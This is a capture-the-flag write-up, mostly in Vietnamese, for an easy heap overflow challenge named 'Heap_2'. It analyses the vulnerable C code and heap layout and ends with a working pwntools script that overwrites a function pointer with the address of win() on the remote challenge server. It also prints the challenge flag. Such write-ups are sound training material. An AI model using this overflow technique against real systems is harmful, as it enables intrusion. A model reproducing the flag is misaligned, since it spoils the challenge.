# [CTF] - [Heap_2]

> **Meta Info**
> - **Author:** Hoan (KMA)
> - **Difficulty:** Easy
> - **Flag:** `academy{and_down_the_road_we_go_358513ca}`

---

## PHẦN 1: PHÂN TÍCH BÀI (Challenge Analysis)

### 1. Thông tin chung & Checksec
- **File nhận được:** `chall`, `chall.c`
- **Kết quả checksec:**
  ```bash
      Arch:     amd64-64-little
      RELRO:    Partial RELRO
      Stack:    No Canary found
      NX:       NX enabled
      PIE:      No PIE 

### 2. Phân tích tĩnh : 
- Chương trình có `Win()` chạy riêng biệt không thể gọi khi chạy chương trình cách bình thường 
```
input_data = malloc(5);
    strncpy(input_data, "pico", 5);
    x = malloc(5);
    strncpy(x, "bico", 5);
```
- Bắt đầu vô chương trình chạy `init()` `malloc` 2 vùng nhớ để ghi dữ liệu 
```
void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}
```
- Hàm cho nhập dữ liệu vào `input -> Heap_overflow`
- Nhìn lên khi chọn `4` sẽ nhảy vào `check_win` : 
```
void check_win() { ((void (*)())*(int*)x)(); }
```
- Điều này có nghĩa là khi `call check_win ` chương trình sẽ nhảy đến địa chỉ đang có trên biến `x` 

## PHẦN 2: HƯỚNG VÀ CÁCH GIẢI :
---
### 1. Ý tưởng :
- Lần chọn đầu chọn `1` sẽ in cho ta 2 địa chỉ của 2 biến đã tạo trước đó từ đó suy ra khoảng cách của chúng , hoặc có thể dùng `vis` trong gdb để xem :
```
0x4056a0        0x0000000000000000      0x0000000000000021      ........!.......
0x4056b0        0x000000006f636970      0x0000000000000000      pico............
0x4056c0        0x0000000000000000      0x0000000000000021      ........!.......
0x4056d0        0x000000006f636962      0x0000000000000000      bico............
0x4056e0        0x0000000000000000      0x0000000000000411      ................
```
- Khi chạy `check_win` chương trình sẽ nhảy thẳng vào bất kì địa chỉ nào mà biến `x` đang chứa hay nói cách khác là ở ô địa chỉ `0x4056c0` 
- Khi chọn `2` ta có thể ghi dữ liệu từ `0x4056b0` đổ xuống mà không qua lớp kiểm tra nào , khi đó ta tính offset để ghì đè từ nơi nhập đến chữ `bico` và đè tiếp địa chỉ của `win()` vô thay cho chữ `bico` -> `call check_win` và lụm 
### 2. Kịch bản tấn công :
```
#!/usr/bin/env python3
from pwn import *

exe = ELF("./chall", checksec=False)
context.binary = exe

#p = process(exe.path)
p = remote('chatelaine.cylabacademy.net',24591)

p.sendlineafter(b'choice: ',b'2')
payload = b'A' * 32 + p64(exe.sym['win'])
p.sendlineafter(b'buffer: ',payload)

p.sendlineafter(b'choice: ',b'4')
p.interactive()
```